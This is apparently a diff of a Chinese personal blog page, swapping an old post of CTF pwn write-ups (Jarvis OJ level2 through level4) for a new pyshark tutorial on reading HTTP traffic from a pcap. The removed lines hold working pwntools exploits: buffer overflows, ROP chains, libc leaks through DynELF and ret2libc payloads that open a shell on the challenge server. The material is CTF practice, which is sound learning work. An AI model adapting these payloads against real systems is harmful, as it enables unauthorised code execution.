+<p>常见的方法是对读取<code>file_data</code> 来进行处理，但是file_data默认是十六进制的数据需要对数据进行处理。但<code>file_data</code> 默认是16进制字符，对于pkt[‘DATA-TEXT-LINES’]的layer来获得body内容，而且代码只需要如下小部分，但是pkt[‘DATA-TEXT-LINES’]一班只在返回包里存在：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> hasattr(pkt, <span class="string">'DATA-TEXT-LINES'</span>):</span><br><span class="line">          body = str(pkt[<span class="string">'DATA-TEXT-LINES'</span>])</span><br><span class="line">          print(<span class="string">'data：\n'</span>+(body))</span><br></pre></td></tr></table></figure>
 
-<p><img src="image-20210113140015120.png" alt="image-20210113140015120"></p>
-<h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><p><img src="image-20210113140431065.png" alt="image-20210113140431065"></p>
-<p>一个32位的程序，只NX保护。看反汇编代码发现栈溢出利用点。</p>
-<p><img src="image-20210113140350462.png" alt="image-20210113140350462"></p>
-<p>同时环境中有system函数，我们可以利用ret2libc的方法。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">e=ELF(<span class="string">'level2'</span>)</span><br><span class="line">p=remote(<span class="string">'pwn2.jarvisoj.com'</span>,<span class="number">9878</span>)<span class="comment">#process('level2')</span></span><br><span class="line"></span><br><span class="line">pay=<span class="string">'a'</span>*<span class="number">0x88</span>+p32(<span class="number">0</span>)+p32(e.plt[<span class="string">'system'</span>])+p32(<span class="number">0x0804A024</span>)+p32(<span class="number">0x0804A024</span>)<span class="comment">#0x0804A024为/bin/sh地址</span></span><br><span class="line"></span><br><span class="line">p.sendline(pay)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>最后，为了方便理解我写了一个安顺序遍历http流量的样例。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> pyshark</span><br><span class="line"><span class="keyword">import</span> urllib.parse, binascii</span><br><span class="line"><span class="comment"># ---------- 配置 ----------</span></span><br><span class="line">PCAP_FILE = <span class="string">r"C:/Users/LEXS/Desktop/att.pcapng"</span>   <span class="comment"># 你的 pcap 路径</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------- 读取流量包 ----------</span></span><br><span class="line">caps = pyshark.FileCapture(PCAP_FILE,display_filter=<span class="string">'http'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> pkt <span class="keyword">in</span> caps:</span><br><span class="line">    <span class="comment"># 1️⃣ 判断是请求还是响应</span></span><br><span class="line">    <span class="keyword">if</span> hasattr(pkt.http, <span class="string">'request_method'</span>):         </span><br><span class="line">        print(<span class="string">"\n--- HTTP REQUEST ---"</span>)</span><br><span class="line">        print(<span class="string">f"Method : <span class="subst">&#123;pkt.http.request_method&#125;</span>"</span>)</span><br><span class="line">        print(<span class="string">f"URI    : <span class="subst">&#123;pkt.http.request_uri&#125;</span>"</span>)</span><br><span class="line">        print(<span class="string">f"Version: <span class="subst">&#123;pkt.http.request_version&#125;</span>"</span>)</span><br><span class="line">        print(<span class="string">f"Host   : <span class="subst">&#123;getattr(pkt.http, <span class="string">'host'</span>, <span class="string">'&lt;none&gt;'</span>)&#125;</span>"</span>)</span><br><span class="line">        print(<span class="string">f"User‑Agent: <span class="subst">&#123;getattr(pkt.http, <span class="string">'user_agent'</span>, <span class="string">''</span>)&#125;</span>"</span>)</span><br><span class="line">        print(<span class="string">f"cookie: <span class="subst">&#123;getattr(pkt.http, <span class="string">'cookie'</span>, <span class="string">''</span>)&#125;</span>"</span>)</span><br><span class="line">        <span class="keyword">if</span> hasattr(pkt.http, <span class="string">'file_data'</span>):</span><br><span class="line">            body = urllib.parse.unquote_plus(binascii.unhexlify(pkt.http.file_data.replace(<span class="string">":"</span>, <span class="string">""</span>)).decode(<span class="string">'utf-8'</span>)) </span><br><span class="line">            print(<span class="string">'data：\n'</span>+(body))</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> hasattr(pkt.http, <span class="string">'response_code'</span>):         <span class="comment"># 响应包</span></span><br><span class="line">        print(<span class="string">"\n--- HTTP RESPONSE ---"</span>)</span><br><span class="line">        print(<span class="string">f"Status : <span class="subst">&#123;pkt.http.response_code&#125;</span> <span class="subst">&#123;pkt.http.response_phrase&#125;</span>"</span>)</span><br><span class="line">        print(<span class="string">f"Version: <span class="subst">&#123;pkt.http.response_version&#125;</span>"</span>)</span><br><span class="line">        print(<span class="string">f"Server : <span class="subst">&#123;getattr(pkt.http, <span class="string">'server'</span>, <span class="string">'&lt;none&gt;'</span>)&#125;</span>"</span>)</span><br><span class="line">        <span class="keyword">if</span> hasattr(pkt.http, <span class="string">'file_data'</span>):</span><br><span class="line">            body = urllib.parse.unquote_plus(binascii.unhexlify(pkt.http.file_data.replace(<span class="string">":"</span>, <span class="string">""</span>)).decode(<span class="string">'utf-8'</span>)) </span><br><span class="line">            print(<span class="string">'data：\n'</span>+(body))</span><br></pre></td></tr></table></figure>
 
-<h2 id="level2-x64"><a href="#level2-x64" class="headerlink" title="level2_x64"></a>level2_x64</h2><p>环境与32位的环境差不多，但是x64的传参与x32下不同。</p>
-<p>x64中前6个参数是按顺序从 rdi ，rsi ，rdx，rcx，r8，r9这6寄存器传递参数的。x32是纯通过栈来传递参数的。因此我们可以用：</p>
-<p><code>ROPgadget --binary level2_x64 --only &#39;pop|ret&#39;</code>来寻找我们可以利用的gadget。</p>
-<p><img src="image-20210113141628743.png" alt="image-20210113141628743"></p>
-<p>exp：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">e=ELF(<span class="string">'level2_x64'</span>)</span><br><span class="line">p=remote(<span class="string">'pwn2.jarvisoj.com'</span>,<span class="number">9882</span>)<span class="comment">#process('level2_x64')</span></span><br><span class="line">pay=<span class="string">'a'</span>*<span class="number">0x80</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x00000004006b3</span>)+p64(<span class="number">0x00000600A90</span>)+p64(e.plt[<span class="string">'system'</span>])</span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
-<h2 id="level3-x64"><a href="#level3-x64" class="headerlink" title="level3_x64"></a>level3_x64</h2><p>为一个64位的程序只开了nx保护。</p>
-<p><img src="image-20210113142124824.png" alt="image-20210113142124824"></p>
-<p>发现栈溢出点但是环境中没有sytstem与<code>/bin/sh</code></p>
-<p>因此我们要泄露出libc版本。ps：在做时，发现LibcSearcher泄露出来不准，因此用leak方法来做的。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">e=ELF(<span class="string">'level3_x64'</span>)</span><br><span class="line">p=remote(<span class="string">'pwn2.jarvisoj.com'</span>,<span class="number">9884</span>)</span><br><span class="line"><span class="comment">#context.update(bits=64)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span></span><br><span class="line">	pay=<span class="string">'a'</span>*<span class="number">0x80</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x00004006AA</span>)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(e.got[<span class="string">'write'</span>])+p64(<span class="number">8</span>)+p64(address)+p64(<span class="number">1</span>)+p64(<span class="number">0x0000000400690</span>)+<span class="string">'\00'</span>*<span class="number">56</span>+p64(e.symbols[<span class="string">'_start'</span>])</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">	p.sendline(pay)</span><br><span class="line">        p.recvline()</span><br><span class="line">	add=p.recv(<span class="number">8</span>)</span><br><span class="line">        <span class="keyword">return</span> add</span><br><span class="line"></span><br><span class="line">d=DynELF(leak,elf=e)</span><br><span class="line">system_addr=d.lookup(<span class="string">'system'</span>,<span class="string">'libc'</span>)</span><br><span class="line"></span><br><span class="line">pay=<span class="string">'a'</span>*<span class="number">0x80</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x00004006AA</span>)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(e.got[<span class="string">'read'</span>])+p64(<span class="number">8</span>)+p64(<span class="number">0x00000000600A88</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x0000000400690</span>)+<span class="string">'\00'</span>*<span class="number">56</span>+p64(e.symbols[<span class="string">'_start'</span>])</span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.send(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">pay=<span class="string">'a'</span>*<span class="number">0x80</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x000004006b3</span>)+p64(<span class="number">0x00000000600A88</span>)+p64(system_addr)+p64(e.symbols[<span class="string">'_start'</span>])</span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
-<h2 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h2><p>方法与level3差不多，leak出libc版本，然后ret2libc。</p>
-<p>exp:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">e=ELF(<span class="string">'level4'</span>)</span><br><span class="line"><span class="comment">#p=process('level4')</span></span><br><span class="line">p=remote(<span class="string">'pwn2.jarvisoj.com'</span>,<span class="number">9880</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span></span><br><span class="line">	pay=<span class="string">'a'</span>*<span class="number">0x88</span>+p32(<span class="number">0</span>)+p32(e.plt[<span class="string">'write'</span>])+p32(e.symbols[<span class="string">'_start'</span>])+p32(<span class="number">1</span>)+p32(address)+p32(<span class="number">4</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">	p.sendline(pay)</span><br><span class="line">	add=p.recv(<span class="number">4</span>)</span><br><span class="line">        <span class="keyword">return</span> add</span><br><span class="line"></span><br><span class="line">d=DynELF(leak,elf=e)</span><br><span class="line">system_addr=d.lookup(<span class="string">'system'</span>,<span class="string">'libc'</span>)</span><br><span class="line"><span class="keyword">print</span> hex(system_addr)</span><br><span class="line">read_plt=e.symbols[<span class="string">'read'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">pay=<span class="string">'a'</span>*<span class="number">0x88</span>+p32(<span class="number">0</span>)+p32(read_plt)+p32(e.symbols[<span class="string">'_start'</span>])+p32(<span class="number">0</span>)+p32(<span class="number">0x0804A024</span>)+p32(<span class="number">8</span>)</span><br><span class="line">p.send(pay)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.send(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"get shell"</span></span><br><span class="line">pay=<span class="string">'a'</span>*<span class="number">0x88</span>+p32(<span class="number">0</span>)+p32(system_addr)+p32(e.symbols[<span class="string">'_start'</span>])+p32(<span class="number">0x0804A024</span>)</span><br><span class="line">p.sendline(pay)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
 
 
       
@@ -419,13 +602,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2021/01/07/xman%20pwn%E9%A2%98%E5%A4%8D%E7%8E%B0/">xman pwn题复现——学pwn小记（4）</a></p>
+        <p><span>本文标题:</span><a href="/2025/09/01/pyshark%E4%B8%8EWireshark%E4%BD%BF%E7%94%A8%E7%94%A8%E6%8A%80%E5%B7%A7%E5%B0%8F%E7%BB%93/">pyshark使用技巧小结</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">lexsd6</a></p>
-        <p><span>发布时间:</span>2021-01-07, 21:44:11</p>
-        <p><span>最后更新:</span>2021-01-13, 15:09:11</p>
+        <p><span>发布时间:</span>2025-09-01, 09:59:36</p>
+        <p><span>最后更新:</span>2025-09-06, 00:04:10</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2021/01/07/xman%20pwn%E9%A2%98%E5%A4%8D%E7%8E%B0/" title="xman pwn题复现——学pwn小记（4）">lexsd6.github.io/2021/01/07/xman%20pwn%E9%A2%98%E5%A4%8D%E7%8E%B0/</a>
-            <span class="copy-path" data-clipboard-text="原文: lexsd6.github.io/2021/01/07/xman%20pwn%E9%A2%98%E5%A4%8D%E7%8E%B0/　　作者: lexsd6" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2025/09/01/pyshark%E4%B8%8EWireshark%E4%BD%BF%E7%94%A8%E7%94%A8%E6%8A%80%E5%B7%A7%E5%B0%8F%E7%BB%93/" title="pyshark使用技巧小结">lexsd6.github.io/2025/09/01/pyshark%E4%B8%8EWireshark%E4%BD%BF%E7%94%A8%E7%94%A8%E6%8A%80%E5%B7%A7%E5%B0%8F%E7%BB%93/</a>
+            <span class="copy-path" data-clipboard-text="原文: lexsd6.github.io/2025/09/01/pyshark%E4%B8%8EWireshark%E4%BD%BF%E7%94%A8%E7%94%A8%E6%8A%80%E5%B7%A7%E5%B0%8F%E7%BB%93/　　作者: lexsd6" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -437,16 +620,10 @@
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2021/01/08/%E5%AE%89%E6%B4%B5%E6%9D%AF2019%E5%A4%8D%E7%8E%B0/">
-                    安洵杯2019复现
-                </a>
-            </div>
-        
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2020/12/31/flask.request%E7%9A%84%E5%86%85%E7%BD%AE%E5%B1%9E%E6%80%A7%E6%80%BB%E7%BB%93/">
-                    flask.request的内置属性总结
+                <a href="/2025/06/19/%E7%AC%AC%E5%85%AD%E7%AB%A0%20%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90-%E5%B8%B8%E8%A7%81%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6%20tomcat/">
+                    第六章-流量特征分析-常见攻击事件-tomcat-玄机靶场
                 </a>
             </div>
         
@@ -477,7 +654,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#level0"><span class="toc-text">level0</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Tell-Me-Something"><span class="toc-text">Tell Me Something</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level1"><span class="toc-text">level1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level2"><span class="toc-text">level2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level2-x64"><span class="toc-text">level2_x64</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level3-x64"><span class="toc-text">level3_x64</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level4"><span class="toc-text">level4</span></a></li></ol>
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#pyshark的基础使用"><span class="toc-text">pyshark的基础使用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-安装"><span class="toc-text">1. 安装</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1‑1-先确保你已安装-Wireshark-tshark"><span class="toc-text">1‑1. 先确保你已安装 Wireshark &#x2F; tshark</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1‑2-安装-PyShark"><span class="toc-text">1‑2. 安装 PyShark</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-基本概念"><span class="toc-text">2. 基本概念</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-基本使用"><span class="toc-text">3.基本使用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#FileCapture与LiveCapture的读取方法"><span class="toc-text">FileCapture与LiveCapture的读取方法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Packet对象"><span class="toc-text">Packet对象</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Layer对象"><span class="toc-text">Layer对象</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pyshark分析http流量"><span class="toc-text">pyshark分析http流量</span></a></li></ol>
         
     </div>
     <style>
@@ -513,7 +690,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"xman pwn题复现——学pwn小记（4）　| lexsd6's home　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"pyshark使用技巧小结　| lexsd6's home　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -566,15 +743,13 @@ document.getElementById("taboola-livere").style='display:none';
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2021/01/08/%E5%AE%89%E6%B4%B5%E6%9D%AF2019%E5%A4%8D%E7%8E%B0/" title="上一篇: 安洵杯2019复现">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
 
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2020/12/31/flask.request%E7%9A%84%E5%86%85%E7%BD%AE%E5%B1%9E%E6%80%A7%E6%80%BB%E7%BB%93/" title="下一篇: flask.request的内置属性总结">
+            <a href="/2025/06/19/%E7%AC%AC%E5%85%AD%E7%AB%A0%20%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90-%E5%B8%B8%E8%A7%81%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6%20tomcat/" title="下一篇: 第六章-流量特征分析-常见攻击事件-tomcat-玄机靶场">
                 <i class="fa fa-angle-right"></i>
             </a>
         
